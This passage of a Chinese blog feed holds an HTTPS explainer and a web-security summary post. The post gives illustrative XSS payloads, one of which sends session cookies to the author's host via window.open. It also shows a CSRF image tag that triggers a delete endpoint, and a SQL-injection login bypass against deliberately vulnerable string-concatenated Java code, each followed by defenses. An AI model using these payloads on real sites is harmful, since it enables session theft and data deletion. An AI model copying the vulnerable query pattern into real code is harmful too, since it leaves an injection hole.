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" alt="avatar"></p><h4><span id="追加内容-https总结">追加内容-HTTPS总结</span></h4><p>更新日期：2021-6-7 14：07 ，1202年了，基本上所有的网站都使用了HTTPS，已经少有网站使用HTTP了，在这里总结下为什么HTTPS传输是安全的。</p><p><strong>为何需要HTTPS？</strong></p><p>因为HTTP是明文传输，可以被中间人攻击。</p><p><strong>如何保证传输安全？</strong></p><p>所有请求加密传输，客户端请求服务器获取公钥 -&gt; 服务器返回公钥 -&gt; 客户端生成密钥发送给服务器 -&gt; 最终所有通信都使用该密钥加密再传输。</p><p>由于密钥只有客户端和服务端持有，中间人即使截获也无法修改内容，因此传输过程是安全的。</p><p>但是这是理想情况，中间人可以截获服务器返回的公钥并返回自己生成的私钥给服务器，因此这个时候就要引进CA证书机构。</p><p><strong>CA证书机构保证密钥传输安全</strong></p><p>既然直接传输无法保证密钥安全，所以引进一个可信任的第三方机构来发放证书，证书中包括公钥，浏览器从证书获取公钥，且证书使用了数字签名来防止被篡改。</p><p>浏览器通过该机构的公钥将证书内容做HASH运算并比较运算结果来检测证书是否被篡改。</p><p><strong>证书机构的公钥从何而来？如何保证证书机构的公钥是可信的？</strong></p><p>浏览器和操作系统会预装可信任的CA机构的根证书，根证书中附带了CA机构的公钥（这就是为什么不要随便安装证书）。</p><p>总结，HTTPS = 加密传输+CA证书机构 </p><h1><span id="关于tcp详细的文章推荐">关于TCP详细的文章推荐</span></h1><p>在浏览器地址栏输入一个URL后回车，背后会进行哪些技术步骤？ - 小林coding的回答 - 知乎</p><p><a href="https://www.zhihu.com/question/34873227/answer/1657140394">https://www.zhihu.com/question/34873227/answer/1657140394</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;HTTP、HTTPS、TCP-IP总结&quot;&gt;&lt;a href=&quot;#HTTP、HTTPS、TCP-IP总结&quot; class=&quot;headerlink&quot; title=&quot;HTTP、HTTPS、TCP/IP总结&quot;&gt;&lt;/a&gt;HTTP、HTTPS、TCP/IP总结&lt;/h1&gt;&lt;h4 id=&quot;协议分类&quot;&gt;&lt;a href=&quot;#协议分类&quot; class=&quot;headerlink&quot; title=&quot;协议分类&quot;&gt;&lt;/a&gt;协议分类&lt;/h4&gt;&lt;p&gt;HTTP属于应用层协议，TCP属于传输层协议，IP属于网络层协议，一个HTTP协议由IP协议包体包含了TCP协议内容，而TCP协议包体又包括了HTTP协议内容，就像一个洋葱。&lt;/p&gt;
&lt;h4 id=&quot;HTTP请求历程&quot;&gt;&lt;a href=&quot;#HTTP请求历程&quot; class=&quot;headerlink&quot; title=&quot;HTTP请求历程&quot;&gt;&lt;/a&gt;HTTP请求历程&lt;/h4&gt;&lt;p&gt;一个HTTP请求的完整历程，首先会根据URL解析请求的地址和端口，此时的地址拿到的一般是域名，因此还需要根据DNS服务器获取域名的真实IP。&lt;/p&gt;
&lt;p&gt;NDS服务查询完毕后，此时浏览器会调用Socket库将HTTP协议里的内容包装成TCP或者UDP协议包。&lt;/p&gt;
&lt;p&gt;光靠TCP协议还无法具备传输功能，因此TCP还需要借助IP协议来定位目标服务器在互联网中的位置，光靠IP依旧无法准确定位，因为一个IP可能有好几台设备使用，要明确要传输的目标还得在IP头部加上目标的MAC地址。&lt;/p&gt;
&lt;p&gt;最后由网卡将数字信息转换为光信号经网线发送出去，将服务器通过交换机和路由器接收到请求包后像剥洋葱一样一层一层解析包中内容。&lt;/p&gt;
&lt;p&gt;小结，一个HTTP请求总共要经历如下几层协议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;应用层：定义数据格式，并按照对应的格式解读数据。 –HTTP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序。 –TCP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发。 –IP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;链路层：对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据。 –物理传输&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="JAVA" scheme="https://reiner.host/categories/JAVA/"/>
    
    
    <category term="TCP" scheme="https://reiner.host/tags/TCP/"/>
    
    <category term="HTTP协议" scheme="https://reiner.host/tags/HTTP%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>WEB安全总结</title>
    <link href="https://reiner.host/posts/d581b2e3.html"/>
    <id>https://reiner.host/posts/d581b2e3.html</id>
    <published>2021-05-13T02:41:00.000Z</published>
    <updated>2021-12-24T12:18:32.977Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="前言">前言</span></h1><p>  最近看了《白帽子讲WEB安全》，书的内容可能已经过时了，但是用来提高安全意识还是不错的，现在将它记下来做个总结。</p><p>WEB安全整体给我的感觉是虽然重要，但攻击手段有限，安全的大头还是在服务器安全这块。</p><h1><span id="xss攻击">XSS攻击</span></h1><p>先来第一个，XSS攻击，XSS攻击主要分为两类： 1、存储型XSS  2、反射型XSS ，先来看反射型XSS攻击。</p><h4><span id="反射型xss攻击">反射型XSS攻击</span></h4><p>所谓反射型XSS攻击其实就是利用JAVASCRIPT解析漏洞，将原本该解析成HTML的内容解析成了JS代码,那么如何实现攻击的呢？ 假设某个20年前原始的网站有如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请输入搜索关键字：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">您的搜索关键字是：$&#123;keyword&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时我们输入：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ,点击搜索后，发现页面上打印alert(xss)了，但是这样只是控制了自己的浏览器JS，没有意义（用浏览器控制台一样可以做到），因此要将此漏洞散布出去。</p><p>假设它的搜索请求url是：<a href="http://reiner.host/search?keyword=WEB%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93">http://reiner.host/search?keyword=WEB安全总结</a> ，将其改为  <a href="http://reiner.host/search?keyword=">http://reiner.host/search?keyword=</a><script>alert(cookie.sid)</script>  ,并将链接分享出去，诱导别人去点击。</p><p>此时这个倒霉鬼如果刚好登陆了该网站，那么你就可以通过JS拿到他的sessionId,然后弄个不可见的iframe将sessionId传到自己的服务器，从而为所欲为了。</p><p>PS:担心加上JS代码后链接过长可以弄个短链接。</p><p><strong>所以防止反射型XSS的关键点在于不能直接将用户输入的内容展现出来</strong>，绝大部分前端框架一般是解决了此问题的，即用户输入内容不会被浏览器解析为JS代码，但不排除一定就没有XSS漏洞了。</p><p><strong>防反射型XSS攻击总结</strong></p><p>1、对于用户输入的内容不要直接展示</p><p>2、使用稳定的开源框架，一般有自动处理</p><p><em>这就是为什么要注意不要乱点链接</em></p><span id="more"></span><h4><span id="储存型xss攻击">储存型XSS攻击</span></h4><p>此类漏洞危害性最大，是反射型XSS攻击的加强版，原理依旧是将用户输入内容解析为JS代码。</p><p>假设某论坛没有对用户输入内容做处理直接展示，此时我新建一个帖子，内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.open(<span class="string">&#x27;http://reiner.host/xss?cookieId=&#x27;</span>+cookie.sessionId);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>标题为：震惊！一对男女大白天在办公室竟干出这种事！（附图片）  ，我相信会有很多人点进来，然后他们就会自动打开新窗口，他们的session id我全知道了。</p><p>如果想做得绝一点，甚至可以做个隐藏表单提交，表单请求一些删除操作的接口。。。</p><p><strong>防存储型XSS攻击总结</strong></p><p>1、在做好反射型XSS攻击的基础上增加XSS过滤器，github上应该有很多现成的xss过滤器可以用，将js代码转义再存储</p><p>2、设置http header里的http only 为true，这样浏览器会禁止js代码读取cookie</p><h1><span id="csrf跨域脚本攻击">CSRF跨域脚本攻击</span></h1><p>CSRF其基本原理是伪造请求，即对于服务器来说，请求是合法的，但是这可能并不是用户主动发起的，假设某论坛网站的删除接口URL是 <a href="https://reiner.host/delete?id=%7Bid%7D">https://reiner.host/delete?id={id}</a> </p><p>通过查看帖子我知道了某用户的一个帖子ID是1，此时我给该用户发私信了，内容是： <code>&lt;img src=&quot;https://reiner.host/delete?id=1&quot;/&gt;</code> 。</p><p>该用户打开私信时看到的只是一张加载失败的图片，但是实际上浏览器已经请求了delete接口，他的ID为1的帖子已经被删除了。</p><p><strong>防CSRF跨域脚本攻击总结</strong></p><p>1、 Referer check来源检查，请求不能是通过其它域名请求过来的。</p><p>2、使用TOKEN验证用户身份，这样伪造请求的接口地址中没有TOKEN就无法请求成功</p><p>以上均为示例，实际攻击手段各种各样。</p><h1><span id="flash漏洞">FLASH漏洞</span></h1><p>这个玩意漏洞一堆，所以可以看到chrome为了安全已经把它禁用了，而且这个年代已经没有人使用FLASH了，因此FLASH直接PASS 。</p><h1><span id="sql注入">SQL注入</span></h1><p>这个年代SQL注入基本上已经凉了，除非某些新手同志写代码不好好用占位符，假设漏洞代码如下 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;login&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(String userName,String password)</span></span>&#123;</span><br><span class="line">  jdbcTemplate.query(<span class="string">&quot;SELECT * FROM USER WHERE USER_NAME = &quot;</span>+userName + <span class="string">&quot; AND PASSWORD = &quot;</span>+password);</span><br><span class="line">  ...以下省略</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在登陆框里输入用户名为：<code>admin --</code> 密码： 随便填 ,拼出来的SQL就变成了：<code>SELECT * FROM USER WHERE USER_NAME = admin --AND PASSWORD=123</code> ,后面的条件都注释掉了。</p><p><strong>应对方法</strong></p><p>1、使用参数占位符，举例：<code>jdbcTemplate.query(&quot;SELECT * FROM USER WHERE USER_NAME = ? AND PASSWORD = ?&quot;,userName,password);</code>,使用mybatis的${}要注意，此符号是拼接SQL。</p><p>2、参数过滤，每个添加、修改请求过滤参数里可能存在的敏感字符，如UPDATE DELETE 等，网上已经有大量的开源工具可以帮我们过滤。</p><h1><span id="会话劫持">会话劫持</span></h1><p>浏览器和服务器之间的通信内容被人抓包到了，劫持人获得了你的TOKEN以及所有请求内容</p><p>解决：<br>1、上HTTPS</p><p>2、每次请求返回带上下一次请求的随机数，后端验证该随机数是否正确</p><h1><span id="其它安全">其它安全</span></h1><p>不在WEB安全范围内，有如下几点：</p><ul><li>TCP连接攻击</li><li>DDOS攻击</li><li>服务器安全配置</li><li>系统漏洞扫描</li><li></li></ul><p><strong>其它WEB安全：</strong></p><ul><li>代码扫描</li><li>XSS漏洞扫描</li></ul><p><strong>渗透测试工具</strong></p><ul><li>SQLmap   - 可自动检测和利用SQL注入漏洞</li><li>John the Ripper   - 一款免费的密码破解软件工具</li><li>Netsparker Security Scanner   - 用于渗透测试的Web应用工具</li><li>W3af - 分析和利用基于Web的应用中可能存在的任何安全漏洞</li></ul><p>以上工具可以帮助我们发现WEB应用中可能存在的漏洞。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;  最近看了《白帽子讲WEB安全》，书的内容可能已经过时了，但是用来提高安全意识还是不错的，现在将它记下来做个总结。&lt;/p&gt;
&lt;p&gt;WEB安全整体给我的感觉是虽然重要，但攻击手段有限，安全的大头还是在服务器安全这块。&lt;/p&gt;
&lt;h1 id=&quot;XSS攻击&quot;&gt;&lt;a href=&quot;#XSS攻击&quot; class=&quot;headerlink&quot; title=&quot;XSS攻击&quot;&gt;&lt;/a&gt;XSS攻击&lt;/h1&gt;&lt;p&gt;先来第一个，XSS攻击，XSS攻击主要分为两类： 1、存储型XSS  2、反射型XSS ，先来看反射型XSS攻击。&lt;/p&gt;
&lt;h4 id=&quot;反射型XSS攻击&quot;&gt;&lt;a href=&quot;#反射型XSS攻击&quot; class=&quot;headerlink&quot; title=&quot;反射型XSS攻击&quot;&gt;&lt;/a&gt;反射型XSS攻击&lt;/h4&gt;&lt;p&gt;所谓反射型XSS攻击其实就是利用JAVASCRIPT解析漏洞，将原本该解析成HTML的内容解析成了JS代码,那么如何实现攻击的呢？ 假设某个20年前原始的网站有如下代码：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;请输入搜索关键字：&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;search&amp;quot;&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;您的搜索关键字是：$&amp;#123;keyword&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;此时我们输入：&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; ,点击搜索后，发现页面上打印alert(xss)了，但是这样只是控制了自己的浏览器JS，没有意义（用浏览器控制台一样可以做到），因此要将此漏洞散布出去。&lt;/p&gt;
&lt;p&gt;假设它的搜索请求url是：&lt;a href=&quot;http://reiner.host/search?keyword=WEB%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93&quot;&gt;http://reiner.host/search?keyword=WEB安全总结&lt;/a&gt; ，将其改为  &lt;a href=&quot;http://reiner.host/search?keyword=&quot;&gt;http://reiner.host/search?keyword=&lt;/a&gt;&lt;script&gt;alert(cookie.sid)&lt;/script&gt;  ,并将链接分享出去，诱导别人去点击。&lt;/p&gt;
&lt;p&gt;此时这个倒霉鬼如果刚好登陆了该网站，那么你就可以通过JS拿到他的sessionId,然后弄个不可见的iframe将sessionId传到自己的服务器，从而为所欲为了。&lt;/p&gt;
&lt;p&gt;PS:担心加上JS代码后链接过长可以弄个短链接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所以防止反射型XSS的关键点在于不能直接将用户输入的内容展现出来&lt;/strong&gt;，绝大部分前端框架一般是解决了此问题的，即用户输入内容不会被浏览器解析为JS代码，但不排除一定就没有XSS漏洞了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;防反射型XSS攻击总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、对于用户输入的内容不要直接展示&lt;/p&gt;
&lt;p&gt;2、使用稳定的开源框架，一般有自动处理&lt;/p&gt;
&lt;p&gt;&lt;em&gt;这就是为什么要注意不要乱点链接&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="JAVA" scheme="https://reiner.host/categories/JAVA/"/>
    
    
    <category term="WEB安全" scheme="https://reiner.host/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
    <category term="xss攻击" scheme="https://reiner.host/tags/xss%E6%94%BB%E5%87%BB/"/>
    
    <category term="csrf攻击" scheme="https://reiner.host/tags/csrf%E6%94%BB%E5%87%BB/"/>
    
    <category term="SQL注入" scheme="https://reiner.host/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
